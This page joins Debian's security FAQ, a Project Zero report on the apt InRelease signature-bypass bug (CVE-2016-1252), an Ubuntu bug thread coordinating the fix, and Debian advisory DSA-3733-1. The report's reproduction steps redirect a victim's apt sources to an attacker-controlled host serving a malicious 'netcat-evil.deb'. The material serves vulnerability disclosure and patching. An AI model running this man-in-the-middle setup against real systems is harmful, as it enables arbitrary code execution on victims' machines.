*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

**Vulnerable App:**

```
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1020

== Vulnerability ==
When apt-get updates a repository that uses an InRelease file (clearsigned
Release files), this file is processed as follows:
First, the InRelease file is downloaded to disk.
In a subprocess running the gpgv helper, "apt-key verify" (with some more
arguments) is executed through the following callchain:

gpgv.cc:main -> pkgAcqMethod::Run -> GPGVMethod::URIAcquire
  -> GPGVMethod::VerifyGetSigners -> ExecGPGV

ExecGPGV() splits the clearsigned file into payload and signature using
SplitClearSignedFile(), calls apt-key on these two files to perform the
cryptographic signature verification, then discards the split files and only
retains the clearsigned original. SplitClearSignedFile() ignores leading and
trailing garbage.

Afterwards, in the parent process, the InRelease file has to be loaded again
so that its payload can be processed. At this point, the code
isn't aware anymore whether the Release file was clearsigned or
split-signed, so the file is opened using OpenMaybeClearSignedFile(), which
first attempts to parse the file as a clearsigned (InRelease) file and extract
the payload, then falls back to treating the file as the file as a split-signed
(Release) file if the file format couldn't be recognized.

The weakness here is: If an attacker can create an InRelease file that
is parsed as a proper split-signed file during signature validation, but then
isn't recognized by OpenMaybeClearSignedFile(), the "leading garbage" that was
ignored by the signature validation is interpreted as repository metadata,
bypassing the signing scheme.

It first looks as if it would be impossible to create a file that is recognized
as split-signed by ExecGPGV(), but isn't recognized by
OpenMaybeClearSignedFile(), because both use the same function,
SplitClearSignedFile(), for parsing the file. However, multiple executions of
SplitClearSignedFile() on the same data can actually have different non-error
results because of a bug.
SplitClearSignedFile() uses getline() to parse the input file. A return code
of -1, which signals that either EOF or an error occured, is always treated
as EOF. The Linux manpage only lists EINVAL (caused by bad arguments) as
possible error code, but because the function allocates (nearly) unbounded
amounts of memory, it can actually also fail with ENOMEM if it runs out of
memory.
Therefore, if an attacker can cause the address space in the main apt-get
process to be sufficiently constrained to prevent allocation of a large line
buffer while the address space of the gpgv helper process is less constrained
and permits the allocation of a buffer with the same size, the attacker can use
this to fake an end-of-file condition in SplitClearSignedFile() that causes the
file to be parsed as a normal Release file.

A very crude way to cause such a constraint on a 32-bit machine is based on
abusing ASLR. Because ASLR randomizes the address space after each execve(),
thereby altering how much contiguous virtual memory is available, an allocation
that attempts to use the average available virtual memory should ideally succeed
50% of the time, resulting in an upper limit of 25% for the success rate of the
whole attack. (That's not very effective, and a real attacker would likely want
a much higher success rate, but it works for a proof of concept.)
This is not necessarily a limitation of the vulnerability, just a limitation
of the way the exploit is designed.

I think that it would make sense to fix this as follows:
 - Set errno to 0 before calling getline(), verify that it's still 0 after
   returning -1, treat it as an error if errno isn't 0 anymore.
 - Consider splitting the InRelease file only once, before signature validation,
   and then deleting the original clearsigned file instead of the payload file.
   This would get rid of the weakness that the file is parsed twice and parsing
   differences can have security consequences, which is a pretty brittle design.
 - I'm not sure whether this bug would have been exploitable if the parser for
   split files or the parser for Release files had been stricter. You might want
   to consider whether you could harden this code that way.

== Reproduction instructions ==
These steps are probably more detailed than necessary.

First, prepare a clean Debian VM for the victim:

 - download debian-8.6.0-i386-netinst.iso (it is important that this
   is i386 and not amd64)
 - install Virtualbox (I'm using version 4.6.36 from Ubuntu)
 - create a new VM with the following properties:
  - type "Linux", version "Debian (32-bit)"
  - 8192 MB RAM (this probably doesn't matter much, especially
    if you enable swap)
  - create a new virtual harddrive, size 20GB (also doesn't matter much)
 - launch the VM, insert the CD
 - pick graphical install
 - in the installer, use defaults everywhere, apart from enabling Xfce
   in the software selection

After installation has finished, log in, launch a terminal,
"sudo nano /etc/apt/sources.list", change the "deb" line for jessie-updates
so that it points to some unused port on the host machine instead of
the proper mirror
("deb http://192.168.0.2:1337/debian/ jessie-updates main" or so).
This simulates a MITM attack or compromised mirror.

On the host (as the attacker):

$ tar xvf apt_sig_bypass.tar
apt_sig_bypass/
apt_sig_bypass/debian/
apt_sig_bypass/debian/netcat-evil.deb
apt_sig_bypass/debian/dists/

$ python -m SimpleHTTPServer 1337 .
Serving HTTP on 0.0.0.0 port 1337 ...

Now, in the VM, as root, run "apt-get update".
It will probably fail - run it again until it doesn't fail anymore.
The errors that can occur are "Clearsigned file isn't valid" (when the
allocation during gpg verification fails) and some message about
a hash mismatch (when both allocations succeed). After "apt-get update"
has succeeded, run "apt-get upgrade" and confirm the upgrade. The result should
look like this (server IP censored, irrelevant output removed and marked with
"[...]"):

As you can see, if the attacker gets lucky with the ASLR randomization, there
are no security warnings and "apt-get upgrade" simply installs the malicious
version of the package. (The dpkg warnings are just because I created a minimal
package file, without some of the usual information.)

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

### Bug Description

We have just been made aware of a security bug upstream that affects the validation of signatures on InRelease file. This bug is to track progress for it.

It allows for attacking a repository via MITM attacks, circumventing the signature of the InRelease file.

It works by making a call to getline() fail with ENOMEM, which is not documented as an error for that but follows from the fact that getline() can allocate memory. In such a case, apt would treat the first part of the file as a valid release file.

Subject: apt: repository signing bypass via memory allocation failure

== Vulnerability ==

When apt-get updates a repository that uses an InRelease file (clearsigned

Release files), this file is processed as follows:

First, the InRelease file is downloaded to disk.

In a subprocess running the gpgv helper, "apt-key verify" (with some more

arguments) is executed through the following callchain:

gpgv.cc:main -> pkgAcqMethod::Run -> GPGVMethod::URIAcquire

  -> GPGVMethod::VerifyGetSigners -> ExecGPGV

ExecGPGV() splits the clearsigned file into payload and signature using

SplitClearSignedFile(), calls apt-key on these two files to perform the

cryptographic signature verification, then discards the split files and only

retains the clearsigned original. SplitClearSignedFile() ignores leading and

trailing garbage.

Afterwards, in the parent process, the InRelease file has to be loaded again

so that its payload can be processed. At this point, the code

isn't aware anymore whether the Release file was clearsigned or

split-signed, so the file is opened using OpenMaybeClearSignedFile(), which

first attempts to parse the file as a clearsigned (InRelease) file and extract

the payload, then falls back to treating the file as the file as a split-signed

(Release) file if the file format couldn't be recognized.

The weakness here is: If an attacker can create an InRelease file that

is parsed as a proper split-signed file during signature validation, but then

isn't recognized by OpenMaybeClearSignedFile(), the "leading garbage" that was

ignored by the signature validation is interpreted as repository metadata,

bypassing the signing scheme.

It first looks as if it would be impossible to create a file that is recognized

as split-signed by ExecGPGV(), but isn't recognized by

OpenMaybeClearSignedFile(), because both use the same function,

SplitClearSignedFile(), for parsing the file. However, multiple executions of

SplitClearSignedFile() on the same data can actually have different non-error

results because of a bug.

SplitClearSignedFile() uses getline() to parse the input file. A return code

of -1, which signals that either EOF or an error occured, is always treated

as EOF. The Linux manpage only lists EINVAL (caused by bad arguments) as

possible error code, but because the function allocates (nearly) unbounded

amounts of memory, it can actually also fail with ENOMEM if it runs out of

memory.

Therefore, if an attacker can cause the address space in the main apt-get

process to be sufficiently constrained to prevent allocation of a large line

buffer while the address space of the gpgv helper process is less constrained

and permits the allocation of a buffer with the same size, the attacker can use

this to fake an end-of-file condition in SplitClearSignedFile() that causes the

file to be parsed as a normal Release file.

A very crude way to cause such a constraint on a 32-bit machine is based on

abusing ASLR. Because ASLR randomizes the address space after each execve(),

thereby altering how much contiguous virtual memory is available, an allocation

that attempts to use the average available virtual memory should ideally succeed

50% of the time, resulting in an upper limit of 25% for the success rate of the

whole attack. (That's not very effective, and a real attacker would likely want

a much higher success rate, but it works for a proof of concept.)

This is not necessarily a limitation of the vulnerability, just a limitation

of the way the exploit is designed.

I think that it would make sense to fix this as follows:

 - Set errno to 0 before calling getline(), verify that it's still 0 after

   returning -1, treat it as an error if errno isn't 0 anymore.

 - Consider splitting the InRelease file only once, before signature validation,

   and then deleting the original clearsigned file instead of the payload file.

   This would get rid of the weakness that the file is parsed twice and parsing

   differences can have security consequences, which is a pretty brittle design.

 - I'm not sure whether this bug would have been exploitable if the parser for

   split files or the parser for Release files had been stricter. You might want

   to consider whether you could harden this code that way.

== Reproduction instructions ==

These steps are probably more detailed than necessary.

First, prepare a clean Debian VM for the victim:

- download debian-8.6.0-i386-netinst.iso (it is important that this

   is i386 and not amd64)

 - install Virtualbox (I'm using version 4.6.36 from Ubuntu)

 - create a new VM with the following properties:

  - type "Linux", version "Debian (32-bit)"

  - 8192 MB RAM (this probably doesn't matter much, especially

    if you enable swap)

  - create a new virtual harddrive, size 20GB (also doesn't matter much)

 - launch the VM, insert the CD

 - pick graphical install

 - in the installer, use defaults everywhere, apart from enabling Xfce

   in the software selection

After installation has finished, log in, launch a terminal,

"sudo nano /etc/apt/sources.list", change the "deb" line for jessie-updates

so that it points to some unused port on the host machine instead of

the proper mirror

("deb <http://192.168.0.2:1337/debian/> jessie-updates main" or so).

This simulates a MITM attack or compromised mirror.

On the host (as the attacker):

$ tar xvf apt\_sig\_bypass.tar

Now, in the VM, as root, run "apt-get update".

It will probably fail - run it again until it doesn't fail anymore.

The errors that can occur are "Clearsigned file isn't valid" (when the

allocation during gpg verification fails) and some message about

a hash mismatch (when both allocations succeed). After "apt-get update"

has succeeded, run "apt-get upgrade" and confirm the upgrade. The result should

The bug was that the return value of getline() was checked for EOF - but getline() also returns on out-of-memory conditions which are thus treated as a end of file.

The attached patch should fix that, but further testing is warranted. If this fix is correct, I'd like to push for a co-ordinated update soon, possibly tomorrow.

Let's reduce the importance. The bug is likely not exploitable in zesty, yakkety and xenial, since all those releases have a size limit of 10 MB for release files.

I'll think a bit more about procedure during sleep. I plan to have the new upstream 1.4~beta2 ready to go tomorrow to fix this issue - zesty currently has 1.3.1 still, 1.4~beta2 is in -proposed already, not sure how that's supposed to be handled (I guess we want to do a 1.3.1 security fix upload for zesty and yakkety. Preferably I'd do a 1.3.2 release "upstream" with just that fix).

I did not have the chance to verify the bug at all yet because I don't really have old apt's lying around and increasing the limit also does not seem to expose it yet. Still, this seems to be a real

problem, so we should indeed fix it everywhere.

I'll let my laptop idle during the night, and will be back at around 9:00 CET for discussing things. Contact me in IRC /query if you can and want to discuss this.

Feel free to take your time on zesty if you want to get it in via e.g. 1.4~beta3 or 1.4.1 or whatever. It's nice to get fixes into devel quickly for those who run it but we don't promise security support for it the same way we do the released releases.

Also note that vivid and wily are EOL. Even though vivid's zombie lives on in Ubuntu touch and snappy core I think the headline feature of those platforms is image-based updates, not apt-based updates, so I suspect we can ignore even vivid.

Thanks

Updated patch attached. This one works differently by putting getline into its own helper function that reports the error, and then aborting after the loop if an error occured inside of it.

This makes it a bit safer.

Sorry about that Marc. There is no real coordination yet, apparently I'm moving a bit too fast for security teams to keep up :)

We received the bug report yesterday from Google with their usual 90 day disclosure deadline:

"This bug is subject to a 90 day disclosure deadline. If 90 days elapse

without a broadly available patch, then the bug report will automatically

become visible to the public."

The fix was simpler than I thought as I misunderstood the initial suggestions (it was a list, I thought we needed to do all in it, but just one thing is enough...). My intention is to provide the fixes today for all affected Debian and Ubuntu releases, in the form of debdiffs in this bug for the Ubuntu ones, to enable some work.

That said, I have no idea how much coordination is needed from security folks, so I'm not sure when we will be able to publicly release it - You guys need to figure that out. I sort of feel offended by security bugs, so I'd really love to move fast on these :)

I'm not a fan of responsible disclosure. I consider it an irresponsible practice, but that's my personal opinion, and if people want to play the game of withholding fixes until everyone catches up, I'm willing to play along for a few days, but not very long.

We're going to need a couple of days for testing it before releasing.

Assuming we have the final patches, would a CRD of 2016-12-13 17:00:00 UTC work for everyone?

Especially because the fix is so tiny and can easily be applied to any affected apt version, and I only know three distributions shipping a self-built apt (Debian, Ubuntu, Tanglu), I'd like to get this rolled out in the next 34 hours basically (until Wed 23:59 CET). I'd be happy extending that to Thu 23:59 CET if that gets a few more distros on board that for whatever reasons ship a self-built apt. But I would not want to hold a fix for Debian and Ubuntu back for longer than that to give 1% or so the time to fix up things, as that would be irresponsible.

Release procedure:

For yakkety, the fix will be a new 1.3.2 "upstream" micro release containing just that fix, so I'll just provide a debdiff for that.

For xenial, there will be a new 1.2.18 upstream micro release, but as 1.2.17 is stuck in the queue for proposed, I can also provide a 1.2.15ubuntu0.1 (did I get that right?) debdiff for security. Once the security upload has been done, I'll replace 1.2.17 with 1.2.18 in the proposed queue.

For trusty, I will provide a debdiff for 1.0.1ubuntu2.16.

Really - 7 days is like crazy long. The fix is basically a simple matter of checking if errno is 0 and returning false in case it is. What do you want to do 7 days testing it?

The yakkety one is basically an upstream release (1.3.2), hence a bit more automated churn in there to update the version number by the build system.

I won't attach the one for 1.2.18 for xenial-proposed, as that's basically the same as 1.3.2, just against 1.2.17 - and we need to get 1.2.15 done first.

Might need some more work with pushing the error stack, so we really only return on errors that occured inside the function and not outside - which \_might\_ prevent other repositories from updating (or at least, it's a weird API).

Hi Julian - I plan to publish the yakkety, xenial, and trusty apt security updates at 2016-12-13 17:00:00 UTC. Test results look good. Thanks for the debdiffs.

That sounds like it matters, where that InRelease file comes from, right? When I look into my /etc/apt/sources.list, I only see deb/dev-src http://<tld>.archive.ubuntu.com/... entries.

I think it would be much better, if Canonical servers would require TLS 1.x encryption (STS preferred) and thusly identify themselves with a proper cert, so machines/users can make sure (nation-state actors not taken into account) who they're talking to.

I think that would definitely make MITM and MOTS attacks more difficult. I'm aware of the signatures, i.e. present package security, though. Nonetheless, they do not seem to address the problem of transport security.

Debian Security Advisory DSA-3733-1                   security@debian.org

Package        : apt
CVE ID         : CVE-2016-1252

Jann Horn of Google Project Zero discovered that APT, the high level
package manager, does not properly handle errors when validating
signatures on InRelease files. An attacker able to man-in-the-middle
HTTP requests to an apt repository that uses InRelease files
(clearsigned Release files), can take advantage of this flaw to
circumvent the signature of the InRelease file, leading to arbitrary
code execution.

For the stable distribution (jessie), this problem has been fixed in
version 1.0.9.8.4.

For the unstable distribution (sid), this problem has been fixed in
version 1.4~beta2.

We recommend that you upgrade your apt packages.
